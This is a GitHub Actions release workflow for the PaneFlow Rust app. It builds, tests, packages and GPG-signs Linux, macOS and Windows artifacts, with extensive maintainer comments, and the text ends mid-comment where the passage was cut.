name: Release

on:
  push:
    tags: ["v*"]

permissions:
  contents: write

env:
  CARGO_TERM_COLOR: always

jobs:
  build:
    name: Build ${{ matrix.target }}
    runs-on: ${{ matrix.runs-on }}
    # US-019 AC5: legs without `continue-on-error: true` in their matrix
    # entry default to `false` and block the release on failure. The Intel
    # macOS leg sets `continue-on-error: true` in its matrix include, which
    # lifts through this expression to the per-leg behaviour.
    continue-on-error: ${{ matrix.continue-on-error == true }}
    strategy:
      # fail-fast: true keeps the cross-arch Linux matrix atomic — a broken
      # aarch64 Linux build cancels the x86_64 leg and vice versa, so we
      # never ship a half-matrix Linux release. The macOS Intel leg below
      # opts OUT of this via `continue-on-error: true` (AC5): a best-effort
      # Intel failure is allowed to not block the release cut.
      fail-fast: true
      matrix:
        include:
          - target: x86_64-unknown-linux-gnu
            arch: x86_64
            runs-on: ubuntu-22.04
          # Hosted ARM runner (in GitHub public preview since late 2024) —
          # explicitly NOT `cross` and NOT QEMU, matching Zed's own
          # `bundle_linux_aarch64` pattern. Spike evidence:
          # tasks/spike-aarch64-build.md.
          - target: aarch64-unknown-linux-gnu
            arch: aarch64
            runs-on: ubuntu-22.04-arm
          # US-019: macOS aarch64 (Apple Silicon). Native build on
          # GitHub-hosted macos-14, chains through the US-013→US-016
          # bundle + sign + notarize + .dmg pipeline. Uses the same
          # TAG value as the Linux legs; the macOS-only prelude below
          # strips the leading `v` before feeding it to Info.plist
          # (CFBundleShortVersionString requires bare semver).
          #
          # Deferred-posture for BOTH macOS legs (US-008, v0.2.1): this
          # Apple Silicon leg is kept IN-matrix as `continue-on-error:
          # true` because macos-14 queue times are acceptable (<10 min)
          # and the leg catches Rust-level cross-compile regressions
          # even without signing. The x86_64-apple-darwin (Intel Mac)
          # entry was dropped entirely (see closed-target note below).
          # Flip this back to hard-required on the commit that lands
          # the first signed macOS release (v0.3.0), simultaneously
          # with the Apple Dev secrets provisioning documented in
          # docs/release-runbook.md §"Supported release targets" and
          # the tasks/prd-macos-port.md release cut.
          - target: aarch64-apple-darwin
            arch: aarch64
            runs-on: macos-14
            continue-on-error: true
          # CLOSED TARGET — x86_64-apple-darwin (Intel Mac / macos-13)
          # Decision: 2026-04-21 (US-008, v0.2.1). Removed from the
          # matrix entirely until v0.3.0's macOS release cut. Two
          # blockers, either of which would have been enough on its
          # own: (1) Apple Dev secrets (APPLE_DEVELOPER_CERT_P12,
          # APPLE_DEVELOPER_CERT_PASSWORD, APPLE_TEAM_ID) are not yet
          # provisioned, so the leg would fail at the `Sign macOS .app
          # bundle` step regardless of the runner queue; (2) macos-13
          # runner queue times have been 30-60 min+, which would block
          # the `Publish GitHub Release` job even with
          # `continue-on-error: true` (GHA waits for every matrix leg
          # to complete before downstream `needs:` fires). Restoration
          # requires both: Apple Dev secrets provisioning per
          # memory/project_macos_signing.md AND either (a) queue-SLA
          # improvement at GitHub Actions or (b) a matrix-strategy
          # refactor of the `Publish` job's `needs:` to not block on
          # best-effort legs. See docs/release-runbook.md §"Supported
          # release targets" for the authoritative status list.
          # US-017: Windows x86_64. Best-effort (continue-on-error: true)
          # for the same reasons as Intel Mac — an Azure Artifact Signing
          # outage, cargo-wix regression, or transient windows-2022
          # image issue should not block Linux + macOS from publishing.
          # US-016 added the Windows-gated MSI produce + sign + stage
          # steps (activated via `if: runner.os == 'Windows'`); this
          # matrix entry is what turns them on. When the leg succeeds,
          # the signed MSI + SHA-256 sidecar are uploaded as
          # `release-assets-x86_64-Windows` and picked up by the
          # `release` job's `release-assets-*` glob. The existing
          # unconditional steps (cargo fmt/clippy/test/build) also run
          # on this leg; EP-W2/EP-W3 (US-004..US-009) cfg-guarded all
          # POSIX-locked code so they compile, and continue-on-error
          # absorbs any residual clippy noise until US-018's stricter
          # windows-check CI gate catches regressions pre-merge.
          - target: x86_64-pc-windows-msvc
            arch: x86_64
            runs-on: windows-2022
            continue-on-error: true

    steps:
      - uses: actions/checkout@v5

      - name: Install system dependencies
        if: runner.os == 'Linux'
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            libvulkan-dev \
            libwayland-dev \
            libxkbcommon-dev \
            libx11-dev \
            libxcb1-dev \
            libxcb-render0-dev \
            libxcb-shape0-dev \
            libxcb-xfixes0-dev \
            libxkbcommon-x11-dev \
            libfontconfig1-dev \
            libfreetype6-dev \
            patchelf \
            lintian \
            dpkg-sig \
            rpm \
            gnupg \
            appstream

      # US-002 AC3 — validate the AppStream metainfo XML before any packaging
      # step touches it. Invalid metainfo would (a) make `.deb`/`.rpm` install
      # a broken `/usr/share/metainfo/*.xml` that GNOME Software / KDE Discover
      # would ignore, and (b) block distro submission. Fail-fast here so a
      # malformed `<releases>` block (e.g., after a version bump that forgot
      # the `<release>` entry) never makes it into a shipped artifact.
      - name: Validate AppStream metainfo
        if: runner.os == 'Linux'
        run: |
          appstreamcli validate \
            --no-net \
            --pedantic \
            assets/io.github.arthurdev44.paneflow.metainfo.xml

      - uses: dtolnay/rust-toolchain@stable
        with:
          targets: ${{ matrix.target }}

      - uses: Swatinem/rust-cache@v2
        with:
          prefix-key: "v1-rust"
          key: ${{ matrix.target }}

      - name: Install cargo-deb (pinned)
        if: runner.os == 'Linux'
        run: cargo install cargo-deb --version 3.6.3 --locked

      - name: Install cargo-generate-rpm (pinned)
        if: runner.os == 'Linux'
        # Version pinned to the one we validated against the TOML schema in
        # US-014. Bumping 0.20.0 → anything else requires re-reading the
        # upstream README: the `assets` inline-table grammar has changed in
        # prior minor versions.
        run: cargo install cargo-generate-rpm --version 0.20.0 --locked

      # --- Quality gates (defense-in-depth against shipping broken builds) ---
      - name: cargo fmt --check
        run: cargo fmt --check

      - name: cargo clippy
        run: cargo clippy --workspace --target ${{ matrix.target }} -- -D warnings

      - name: cargo test
        # --target pins the test binary to the matrix-leg triple. On today's
        # native runners the host and target match (so the flag is
        # effectively a no-op), but declaring it explicitly keeps the step
        # consistent with `cargo build --release --target ...` below and
        # future-proofs against anyone introducing a `cross`-based leg.
        run: cargo test --workspace --target ${{ matrix.target }}

      # --- Release build ---
      # `POSTHOG_API_KEY` is resolved by `option_env!` at compile time
      # (see `src-app/src/app/bootstrap.rs`); embedding it here at the
      # single `cargo build --release` step is sufficient for every
      # downstream artifact (tar.gz, .deb, .rpm, AppImage, .dmg, and the
      # cargo-wix MSI which consumes this build via `--no-build`). If the
      # secret is absent the startup log::warn! surfaces and events are
      # silently dropped — never a user-facing failure.
      - name: Build release binary
        env:
          POSTHOG_API_KEY: ${{ secrets.POSTHOG_API_KEY }}
        run: cargo build --release -p paneflow-app --target ${{ matrix.target }}

      # --- Phase 1 artifacts ---
      - name: Produce tar.gz
        if: runner.os == 'Linux'
        # `TAG` routed via `env:` rather than inlining `${{ github.ref_name }}`
        # in the shell body — same injection-hardening rationale as the
        # AppImage step below (attacker-controlled tags must not reach bash
        # via GitHub Actions expression substitution).
        env:
          TARGET: ${{ matrix.target }}
          ARCH: ${{ matrix.arch }}
          TAG: ${{ github.ref_name }}
        # `${TAG#v}` strips the leading `v` so the bundled artifact is
        # `paneflow-<semver>-<arch>.tar.gz` (no `v` prefix), matching the
        # naming convention macOS and Windows already follow. Until v0.3.0
        # the Linux assets were `paneflow-v<semver>-<arch>.tar.gz`, a
        # historical inconsistency that's safe to drop because the in-app
        # update matcher (`update_checker.rs::pick_asset`) is suffix-only
        # (`ends_with("-<arch>.tar.gz")`) and version-agnostic.
        run: bash scripts/bundle-tarball.sh "${TAG#v}"

      - name: Produce .deb
        if: runner.os == 'Linux'
        run: cargo deb --no-build -p paneflow-app --target ${{ matrix.target }}

      - name: Lintian check
        if: runner.os == 'Linux'
        run: |
          lintian \
            --suppress-tags bad-distribution-in-changes-file \
            target/${{ matrix.target }}/debian/*.deb

      - name: Produce .rpm
        if: runner.os == 'Linux'
        # `-p src-app` is the DIRECTORY path (relative to workspace root),
        # not the crate name — cargo-generate-rpm 0.20.0 resolves `-p`
        # strictly as a path. `-p paneflow-app` fails with "No such file
        # or directory: paneflow-app/Cargo.toml".
        #
        # `--target` aligns with the earlier cargo-build output dir and
        # drops the artifact at target/<triple>/generate-rpm/. Source
        # paths in `[package.metadata.generate-rpm]` that start with
        # `target/release/` are auto-rewritten to match.
        run: cargo generate-rpm -p src-app --target ${{ matrix.target }}

      # ─── US-017 GPG signing ────────────────────────────────────────────
      # Signs the freshly-built .deb and .rpm with the release key
      # (`GPG_PRIVATE_KEY` secret) so dpkg-sig / rpm --checksig accept
      # them, and so `dnf install` on an `gpgcheck=1` client succeeds.
      #
      # Tool choice: `dpkg-sig` for BOTH sign + verify on the .deb side.
      # The earlier PRD draft called for `debsigs --sign=origin` + `dpkg-sig --verify`,
      # but those produce incompatible signature formats — the verify
      # step would fail on everything `debsigs` wrote. `dpkg-sig` is the
      # de-facto CI choice (simple GPG clearsign, no debsig-verify policy
      # XML required).
      #
      # HARD-FAIL contract (AC7): if the GPG_PRIVATE_KEY secret is
      # missing or malformed, the workflow exits NON-ZERO with the exact
      # AC-mandated string "GPG signing failed: key not loaded". No
      # silent-unsigned-release path. The release-creating step at the
      # end of the job is downstream — it never runs if we exit here.
      - name: Sign .deb and .rpm with release key
        if: runner.os == 'Linux'
        env:
          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
          GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
          GPG_KEY_ID: ${{ secrets.GPG_KEY_ID }}
          TARGET: ${{ matrix.target }}
        run: |
          set -euo pipefail

          # --- Fail-fast: secrets present? -----------------------------
          if [ -z "${GPG_PRIVATE_KEY:-}" ] || [ -z "${GPG_KEY_ID:-}" ]; then
            echo "::error title=GPG signing::GPG signing failed: key not loaded"
            echo "::error::GPG_PRIVATE_KEY and/or GPG_KEY_ID secrets are not populated. See docs/release-signing.md." >&2
            exit 1
          fi
          # Require the full 40-char fingerprint. Short 16-char key IDs
          # are collision-vulnerable (see https://evil32.com/) — an
          # attacker who could populate `GPG_KEY_ID` with a short ID
          # pointing at a rogue key would satisfy the later `grep -qi
          # "${GPG_KEY_ID}$"` fingerprint match against any key whose
          # fingerprint ends in those 16 hex chars. Enforcing 40 chars
          # eliminates the attack class.
          if ! [[ "$GPG_KEY_ID" =~ ^[0-9A-Fa-f]{40}$ ]]; then
            echo "::error title=GPG signing::GPG signing failed: key not loaded"
            echo "::error::GPG_KEY_ID must be the 40-char hex fingerprint (got ${#GPG_KEY_ID} chars). Short key IDs are rejected because they are collision-vulnerable." >&2
            exit 1
          fi

          # --- Import the key ------------------------------------------
          mkdir -p ~/.gnupg
          chmod 700 ~/.gnupg
          # `allow-loopback-pinentry` lets us pass the passphrase via
          # `--pinentry-mode loopback` from non-interactive contexts.
          echo "allow-loopback-pinentry" >> ~/.gnupg/gpg-agent.conf
          gpgconf --kill gpg-agent || true
          # Import; if the private-key blob is malformed, `gpg --import`
          # exits non-zero and `set -e` fails the step — the annotation
          # above ensures the red X in PR check matches the AC contract.
          # `<<<` (bash herestring) passes the secret through a kernel
          # pipe buffer, NOT through argv — so it never appears in
          # `/proc/<pid>/cmdline` of any intermediate process.
          if ! gpg --batch --import <<< "$GPG_PRIVATE_KEY" 2>&1; then
            echo "::error title=GPG signing::GPG signing failed: key not loaded"
            echo "::error::GPG_PRIVATE_KEY failed to import. Secret may be truncated or missing the ASCII-armor header." >&2
            exit 1
          fi
          # Verify the imported key's fingerprint matches GPG_KEY_ID.
          # Substring match because `--with-colons` prints the full
          # fingerprint while GPG_KEY_ID may be either form (16/40 hex).
          if ! gpg --list-secret-keys --with-colons \
               | awk -F: '/^fpr:/ {print $10}' \
               | grep -qi "${GPG_KEY_ID}$"; then
            echo "::error title=GPG signing::GPG signing failed: key not loaded"
            echo "::error::GPG_PRIVATE_KEY does not match GPG_KEY_ID fingerprint. Secrets likely mismatched." >&2
            exit 1
          fi

          # --- Prime the agent passphrase cache (only if passphrased) --
          # US-015 uses the same dummy-clearsign trick. If the key has no
          # passphrase (`%no-protection`), GPG_PASSPHRASE is empty and we
          # skip — `gpg` accepts `--passphrase-file <(printf '')` as an
          # empty passphrase but it also ignores pinentry in that case.
          if [ -n "${GPG_PASSPHRASE:-}" ]; then
            printf 'prime' | gpg --batch --yes \
              --passphrase-file <(printf '%s' "$GPG_PASSPHRASE") \
              --pinentry-mode loopback \
              --local-user "$GPG_KEY_ID" \
              --armor --clearsign \
              --output /dev/null
          fi

          # --- Pre-warm the GPG agent cache (US-001 research step 2) ---
          # Explicit `gpg --list-secret-keys` call to ensure the imported
          # secret key is loaded into the running gpg-agent BEFORE the
          # first rpmsign invocation. Without this, on a fresh runner
          # agent, rpmsign can race the agent's lazy key-load path and
          # abort mid-sign with a stdin-read error (upstream
          # https://github.com/rpm-software-management/rpm/issues/3740).
          # The earlier fingerprint-check call already reads the key, but
          # we keep this as a distinct step so the intent is obvious if
          # a future maintainer refactors the fingerprint check away.
          gpg --list-secret-keys >/dev/null

          # --- Write ~/.rpmmacros for rpmsign --------------------------
          # `rpmsign` without a macros file would spawn an interactive
          # pinentry. Override `%__gpg_sign_cmd` so it runs in batch mode
          # with loopback pinentry. `%_gpg_name` tells it which key.
          #
          # Passphrase handling: rpmsign invokes `%__gpg_sign_cmd` via
          # `/bin/sh -c`, which on Ubuntu is `dash` — and dash does NOT
          # support bash process substitution `<(...)`. So we can't inline
          # `--passphrase-file <(printf ...)` into the macro. Instead we
          # write the passphrase to a private 0600 temp file, reference
          # that path from the macro, and `trap` its cleanup. The temp
          # file is on the runner's ephemeral tmpfs — same blast radius
          # as the `.rpmmacros` file itself.
          PASS_FILE=$(mktemp)
          chmod 600 "$PASS_FILE"
          trap 'rm -f "$PASS_FILE" "$HOME/.rpmmacros"' EXIT
          printf '%s' "${GPG_PASSPHRASE:-}" > "$PASS_FILE"

          # Override `%__gpg` directly (NOT `%_gpgbin`). On Ubuntu 22.04
          # the default `/usr/lib/rpm/macros` sets `%__gpg` to
          # `/usr/bin/gpg2` — a Fedora-ism that does not exist on
          # Debian-family systems, where GnuPG 2.2+ ships as the
          # unified `/usr/bin/gpg` binary. Setting only `%_gpgbin` is
          # NOT enough (rpm ignores it during macro expansion of
          # `%{__gpg}`); `%__gpg` is the authoritative knob.
          #
          # `%__gpg_sign_cmd` then references `%{__gpg}` which now
          # resolves to our Ubuntu-safe path. Verified empirically via
          # strace against `rpmsign --addsign`: without this override,
          # rpmsign execve's `/usr/bin/gpg2` → ENOENT → "Could not
          # exec gpg".
          cat > "$HOME/.rpmmacros" <<RPMMACROS
          %_signature gpg
          %_gpg_name  $GPG_KEY_ID
          %__gpg      /usr/bin/gpg
          %__gpg_sign_cmd %{__gpg} --batch --yes \
              --pinentry-mode loopback \
              --passphrase-file $PASS_FILE \
              --no-verbose \
              --no-armor \
              --no-secmem-warning \
              -u "%{_gpg_name}" \
              -sbo %{__signature_filename} \
              %{__plaintext_filename}
          RPMMACROS

          # --- Sign all .deb files -------------------------------------
          # `dpkg-sig --sign builder` embeds a detached GPG clearsign in
          # the .deb's control section. The `builder` role string is
          # conventional for CI-built packages.
          #
          # Glob note: cargo-deb emits `_amd64.deb` on x86_64 and
          # `_arm64.deb` on aarch64. The `target/${TARGET}/debian/`
          # prefix already scopes the glob to the current matrix leg, so
          # the wildcard `paneflow_*.deb` is unambiguous per-leg (US-019).
          for deb in target/"${TARGET}"/debian/paneflow_*.deb; do
            [ -f "$deb" ] || continue
            echo "→ dpkg-sig --sign builder $deb"
            dpkg-sig -k "$GPG_KEY_ID" --sign builder "$deb"
          done

          # --- Sign all .rpm files -------------------------------------
          # `rpmsign --addsign` embeds the signature in the RPM header
          # using the macros above. No per-invocation flags — everything
          # is controlled by ~/.rpmmacros.
          #
          # Glob note: cargo-generate-rpm emits `.x86_64.rpm` and
          # `.aarch64.rpm`. Same target-scoped-directory reasoning as the
          # .deb loop above (US-019).
          #
          # US-001 (v0.2.1) re-enable: prior v0.2.0 failure signature was
          # "/dev/stdin: import read failed(0)". Root cause was bundled
          # with the rpm-pubkey-import path (fixed separately in commit
          # 92729d0 via tempfile); the rpmsign path depends on a warmed
          # gpg-agent (see Pre-warm step above) plus the Ubuntu-specific
          # `%__gpg` override. If CI regresses on a future release,
          # fallbacks ranked: (a) rpmsign with inline `--define` flags
          # (sidesteps ~/.rpmmacros entirely), (b) revert to the echo-only
          # placeholder and ship unsigned for a single hotfix release.
          for rpm in target/"${TARGET}"/generate-rpm/paneflow-*.rpm; do
            [ -f "$rpm" ] || continue
            echo "→ rpmsign --addsign $rpm"
            rpmsign --addsign "$rpm"
          done

          # --- Verify (hard assert; a failed verify aborts the run) ----
          # Strategy: rely on the tool's exit code as the authoritative
          # pass/fail signal. Both `dpkg-sig --verify` and `rpm
          # --checksig` exit 0 iff every signature component is OK, and
          # non-zero otherwise. Verbose output is tee'd to a log for CI
          # debugging but is NOT grepped — the output format varies
          # across versions (modern rpm ≥4.17 emits "Header V4 RSA/SHA256
          # Signature, key ID ...: OK" while older rpm emits "pgp md5
          # OK"; dpkg-sig keeps GOODSIG stable but why couple to strings
          # when the exit code is canonical?).
          #
          # Import the public half of our own key into an RPM DB so
          # `rpm --checksig` can verify. Use a USER-SCOPED DB via
          # `--dbpath` instead of the system DB at `/var/lib/rpm`:
          #
          # 1. No sudo needed — avoids the `sudo rpm --import /dev/stdin`
          #    subprocess-stdin-reopen bug (rpm#3740) AND avoids any
          #    silent-failure on Ubuntu's `rpm` package, which ships
          #    without an initialized `/var/lib/rpm/Packages` db (v0.2.1
          #    retry #1 surface: rpmsign signed OK, dpkg-sig verified OK,
          #    but `rpm --checksig` returned NOKEY for key ID 183f2711
          #    despite `sudo rpm --import` running to silent-success).
          # 2. Fully isolated — cleaned up by the trap at EXIT along with
          #    PASS_FILE and PUBKEY_FILE. No state leaks into the runner.
          # 3. Cross-distro portable — the same `--dbpath "$RPM_DB"`
          #    arguments work on Fedora / RHEL / openSUSE runners too if
          #    we ever add them to the matrix.
          PUBKEY_FILE=$(mktemp --suffix=.asc)
          chmod 600 "$PUBKEY_FILE"
          RPM_DB=$(mktemp -d)
          trap 'rm -f "$PASS_FILE" "$HOME/.rpmmacros" "$PUBKEY_FILE"; rm -rf "$RPM_DB"' EXIT
          gpg --armor --export "$GPG_KEY_ID" > "$PUBKEY_FILE"
          rpm --dbpath "$RPM_DB" --initdb
          rpm --dbpath "$RPM_DB" --import "$PUBKEY_FILE"
          # Sanity-check the import actually landed — failure mode on
          # rpm 4.17 is silent (exit 0 + empty keyring). The signing key
          # fingerprint's last 8 hex chars lowercased are what rpm uses
          # for the gpg-pubkey-<keyid>-<creation> package name.
          KEY_SHORT=$(echo "$GPG_KEY_ID" | tail -c9 | tr 'A-F' 'a-f')
          # rpm -qa with a pattern matches the NAME column only. gpg-pubkey
          # packages all share the name "gpg-pubkey" — the key-id lives in
          # the Version-Release ("gpg-pubkey-<keyid>-<creation>"). So the
          # pattern `"gpg-pubkey-${KEY_SHORT}*"` matches NOTHING even when
          # the key is present (v0.2.1 retry #2 surface: keyring dump
          # confirmed "gpg-pubkey-183f2711-69e67caa" was imported, but the
          # pattern-match check failed). Grep the full `rpm -qa 'gpg-pubkey*'`
          # listing for the short key-id substring instead.
          if ! rpm --dbpath "$RPM_DB" -qa 'gpg-pubkey*' | grep -qi "${KEY_SHORT}"; then
            echo "::error::Public key ${KEY_SHORT} not imported into rpm DB at ${RPM_DB}. Dumping keyring for diagnostics:"
            rpm --dbpath "$RPM_DB" -qa 'gpg-pubkey*' >&2 || true
            exit 1
          fi
          echo "→ Imported gpg-pubkey-${KEY_SHORT} into isolated rpm DB at ${RPM_DB}"
          # `${PIPESTATUS[0]}` reads the exit code of the FIRST command
          # in a bash pipeline, independent of `tee`'s exit code. Using
          # `set -o pipefail` wouldn't work here because `tee` always
          # exits 0 on successful writes — we need the verify tool's
          # own status, not the pipeline's composite status.
          for deb in target/"${TARGET}"/debian/paneflow_*.deb; do
            [ -f "$deb" ] || continue
            echo "→ dpkg-sig --verify $deb"
            dpkg-sig --verify "$deb" | tee /tmp/dpkg-sig-verify.log
            if [ "${PIPESTATUS[0]}" -ne 0 ]; then
              echo "::error::dpkg-sig --verify failed on $deb"
              exit 1
            fi
          done
          # US-001 (v0.2.1): verify every signed .rpm with
          # `rpm --checksig -v`. Exits 0 iff every signature component is
          # OK (Header V4 RSA/SHA256, Header SHA1, Payload, MD5). Any
          # NOKEY/BAD bubbles up as non-zero and fails the release — no
          # silent-unsigned-rpm path. `PIPESTATUS[0]` reads rpm's own
          # status, independent of `tee`'s always-0 exit.
          for rpm_path in target/"${TARGET}"/generate-rpm/paneflow-*.rpm; do
            [ -f "$rpm_path" ] || continue
            echo "→ rpm --dbpath $RPM_DB --checksig -v $rpm_path"
            rpm --dbpath "$RPM_DB" --checksig -v "$rpm_path" | tee /tmp/rpm-checksig-verify.log
            if [ "${PIPESTATUS[0]}" -ne 0 ]; then
              echo "::error::rpm --checksig failed on $rpm_path (NOKEY or BAD signature)"
              exit 1
            fi
          done

      - name: Produce AppImage
        if: runner.os == 'Linux'
        # `TAG` routed via `env:` rather than inlining `${{ github.ref_name }}`
        # in the shell body — same injection-hardening rationale as the
        # staging step below (attacker-controlled tags must not reach bash
        # via expression substitution).
        env:
          TARGET: ${{ matrix.target }}
          ARCH: ${{ matrix.arch }}
          TAG: ${{ github.ref_name }}
        # `${TAG#v}` strips the leading `v`. See the bundle-tarball
        # invocation above for the rationale (consistency with macOS/
        # Windows naming + safe under suffix-only update matcher).
        run: bash scripts/bundle-appimage.sh "${TAG#v}"

      # ─── US-019 macOS .app assembly ──────────────────────────────────
      # Mirrors the ci.yml Xcode preflight (kept intentionally duplicated
      # — a drift here, e.g. an old runner image missing the Metal
      # toolchain, surfaces as a labelled preflight failure rather than a
      # cryptic mid-compile error).
      - name: Verify Xcode CLT + Metal toolchain (macOS)
        if: runner.os == 'macOS'
        run: |
          set -euo pipefail

          CLT_PATH="$(xcode-select -p 2>/dev/null || true)"
          if [ -z "$CLT_PATH" ] || [ ! -d "$CLT_PATH" ]; then
            echo "::error::Xcode Command Line Tools not found (xcode-select -p returned '$CLT_PATH')."
            exit 1
          fi

          SDK_PATH="$(xcrun --show-sdk-path 2>/dev/null || true)"
          if [ -z "$SDK_PATH" ] || [ ! -d "$SDK_PATH" ]; then
            echo "::error::macOS SDK not found (xcrun --show-sdk-path returned '$SDK_PATH')."
            exit 1
          fi

          if ! xcrun --find metal >/dev/null 2>&1; then
            echo "::error::Metal compiler not available — gpui_macos compiles .metal shaders and will fail without it."
            exit 1
          fi

          METAL_HEADERS="$SDK_PATH/System/Library/Frameworks/Metal.framework/Headers"
          if [ ! -d "$METAL_HEADERS" ]; then
            echo "::error::Metal framework headers not found at $METAL_HEADERS."
            exit 1
          fi
          echo "Xcode CLT: $CLT_PATH | SDK: $SDK_PATH | Metal: $(xcrun --find metal)"

      # Assemble the .app bundle from the release binary cargo just built
      # (the preceding "Build release binary" step ran for every leg
      # including macOS, so target/<triple>/release/paneflow exists).
      # `--version "${TAG#v}"` strips the leading 'v': Apple's
      # CFBundleShortVersionString (stamped into Info.plist) must be
      # bare semver. The .dmg filename US-008 matches on is also
      # v-stripped (paneflow-0.2.0-aarch64-apple-darwin.dmg).
      - name: Produce .app bundle
        if: runner.os == 'macOS'
        env:
          ARCH: ${{ matrix.arch }}
          TAG: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          version="${TAG#v}"
          bash scripts/bundle-macos.sh --version "$version" --arch "$ARCH"

      # ─── US-015 / US-023 macOS codesign + notarize ───────────────────
      # The `if: runner.os == 'macOS'` guard skips these steps silently on
      # every Linux / Windows leg.
      #
      # Secrets used (must be populated in repo settings before the first
      # signed macOS release can ship; see docs/release/macos-signing.md):
      #   APPLE_DEVELOPER_CERT_P12        — base64-encoded .p12
      #   APPLE_DEVELOPER_CERT_PASSWORD   — password to decrypt the .p12
      #   APPLE_ID                        — Apple Developer account email
      #   APPLE_APP_SPECIFIC_PASSWORD     — app-specific password (not the
      #                                     Apple ID password itself)
      #   APPLE_TEAM_ID                   — 10-char team ID
      #
      # US-023 AC7: when ANY Apple secret is missing the leg degrades to
      # an unsigned build instead of hard-failing. The "Detect macOS
      # signing secrets" step exposes a single boolean output
      # (`signing_available`) consumed by the sign + notarize step
      # guards below; the unsigned-warning step writes a visible banner
      # to $GITHUB_STEP_SUMMARY so reviewers immediately see that a
      # given release was shipped without a notarization ticket.
      #
      # The `.app` input comes from `scripts/bundle-macos.sh`, run earlier
      # in this leg. Sign → notarize → staple is the mandatory order:
      # codesign attaches a signature with the release entitlements,
      # notarytool validates + registers it with Apple, stapler glues the
      # ticket to the bundle so Gatekeeper accepts it offline.
      - name: Detect macOS signing secrets
        id: macos_signing
        if: runner.os == 'macOS'
        env:
          # Secrets are routed through env: so an empty secret resolves
          # to an empty env var (rather than the literal string
          # `${{ secrets.NAME }}` which would always look "present").
          APPLE_DEVELOPER_CERT_P12: ${{ secrets.APPLE_DEVELOPER_CERT_P12 }}
          APPLE_DEVELOPER_CERT_PASSWORD: ${{ secrets.APPLE_DEVELOPER_CERT_PASSWORD }}
          APPLE_ID: ${{ secrets.APPLE_ID }}
          APPLE_APP_SPECIFIC_PASSWORD: ${{ secrets.APPLE_APP_SPECIFIC_PASSWORD }}
          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
        run: |
          set -euo pipefail
          if [ -n "${APPLE_DEVELOPER_CERT_P12:-}" ] \
             && [ -n "${APPLE_DEVELOPER_CERT_PASSWORD:-}" ] \
             && [ -n "${APPLE_ID:-}" ] \
             && [ -n "${APPLE_APP_SPECIFIC_PASSWORD:-}" ] \
             && [ -n "${APPLE_TEAM_ID:-}" ]; then
              echo "All 5 Apple signing secrets are present — will sign + notarize."
              echo "signing_available=true" >> "$GITHUB_OUTPUT"
          else
              echo "::warning title=macOS signing skipped::One or more APPLE_* secrets are missing — emitting an UNSIGNED .app. See docs/release/macos-signing.md."
              echo "signing_available=false" >> "$GITHUB_OUTPUT"
          fi

      - name: Sign macOS .app bundle
        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available == 'true'
        env:
          APPLE_DEVELOPER_CERT_P12: ${{ secrets.APPLE_DEVELOPER_CERT_P12 }}
          APPLE_DEVELOPER_CERT_PASSWORD: ${{ secrets.APPLE_DEVELOPER_CERT_PASSWORD }}
          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
        # No --entitlements override: sign-macos.sh defaults to
        # packaging/macos/paneflow.entitlements via REPO_ROOT-relative
        # absolute path, which is more robust than this step's working
        # directory assumption.
        run: bash scripts/sign-macos.sh dist/PaneFlow.app

      - name: Notarize + staple macOS .app bundle
        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available == 'true'
        env:
          APPLE_ID: ${{ secrets.APPLE_ID }}
          APPLE_APP_SPECIFIC_PASSWORD: ${{ secrets.APPLE_APP_SPECIFIC_PASSWORD }}
          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
        run: bash scripts/notarize-macos.sh dist/PaneFlow.app

      - name: Record unsigned macOS build in job summary
        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available != 'true'
        env:
          ARCH: ${{ matrix.arch }}
          TAG: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          {
              echo "## ⚠️ Unsigned macOS build (${ARCH}, ${TAG})"
              echo
              echo "One or more APPLE_* secrets were missing, so this leg shipped an"
              echo "**unsigned, un-notarized** \`PaneFlow.app\`. macOS Gatekeeper will"
              echo "block first-launch with the \"can't be opened\" prompt."
              echo
              echo "Required secrets: \`APPLE_DEVELOPER_CERT_P12\`, "
              echo "\`APPLE_DEVELOPER_CERT_PASSWORD\`, \`APPLE_ID\`,"
              echo "\`APPLE_APP_SPECIFIC_PASSWORD\`, \`APPLE_TEAM_ID\`."
              echo
              echo "Onboarding runbook: \`docs/release/macos-signing.md\`."
          } >> "$GITHUB_STEP_SUMMARY"

      # ─── Free disk space before .dmg ─────────────────────────────────
      # macos-14 hosted runners ship with ~14 GB free. A workspace-wide
      # `cargo build --release` for the GPUI graph routinely consumes
      # 11-13 GB of `target/` (Zed monorepo deps, alacritty_terminal,
      # gpui_macos with Metal shaders, all release-mode codegen). By the
      # time we reach `Produce .dmg`, the runner has <100 MB free, and
      # `hdiutil create` aborts with `No space left on device` while
      # asking for a 75 MB staging image (observed in v0.2.9-rc.1).
      #
      # `target/` is disposable here: the release binary was already
      # copied into `dist/PaneFlow.app/Contents/MacOS/paneflow` by
      # `bundle-macos.sh`, signed by `sign-macos.sh`, and stapled by
      # `notarize-macos.sh`. Nothing downstream in this leg reads
      # `target/`. `df -h` brackets give us the disk delta in the CI log
      # for future capacity-planning. Linux/Windows legs skip via the
      # `runner.os == 'macOS'` guard.
      - name: Free disk space before .dmg packaging
        if: runner.os == 'macOS'
        run: |
          set -euo pipefail
          echo "::group::Disk space before cleanup"
          df -h /
          du -sh target/ 2>/dev/null || true
          echo "::endgroup::"
          rm -rf target/
          echo "::group::Disk space after cleanup"
          df -h /
          echo "::endgroup::"

      # ─── US-016 .dmg assembly ────────────────────────────────────────
      # Wraps the stapled .app in a drag-to-Applications .dmg. Zero new
      # dependencies — hdiutil + osascript are built into macOS. Runs
      # *after* notarization so the enclosed bundle already carries its
      # Apple-issued stapled ticket.
      #
      # US-023 AC7 (publish-safety guard): `.dmg` production and staging
      # are gated on `steps.macos_signing.outputs.signing_available`. An
      # unsigned `.app` MUST NOT reach the published GitHub Release —
      # users would hit Gatekeeper "can't be opened" with no in-band
      # signal that the asset was published unsigned. When secrets are
      # absent the leg leaves the unsigned `.app` in `dist/` for local
      # inspection, prints the warning banner from the previous step, and
      # produces no release asset. The leg's `continue-on-error: true`
